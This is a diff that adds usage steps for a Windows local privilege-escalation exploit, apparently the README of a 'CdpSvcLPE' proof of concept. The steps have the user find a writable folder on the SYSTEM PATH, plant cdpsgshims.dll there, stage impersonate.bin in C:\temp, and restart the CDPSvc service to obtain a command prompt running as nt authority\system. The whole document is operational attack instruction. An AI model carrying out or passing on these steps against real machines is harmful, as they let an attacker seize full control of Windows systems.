@@ -1,0 +1,11 @@
+1. Find Writable SYSTEM PATH with acltest.ps1 (such as C:\python27)
+
+2. Copy cdpsgshims.dll to C:\python27 
+
+3. make C:\temp folder and copy impersonate.bin to C:\temp
+C:\CdpSvcLPE> mkdir C:\temp
+C:\CdpSvcLPE> copy impersonate.bin C:\temp
+
+4. Reboot (or stop/start CDPSvc as an administrator)
+
+5. cmd wil prompt up with nt authority\system.
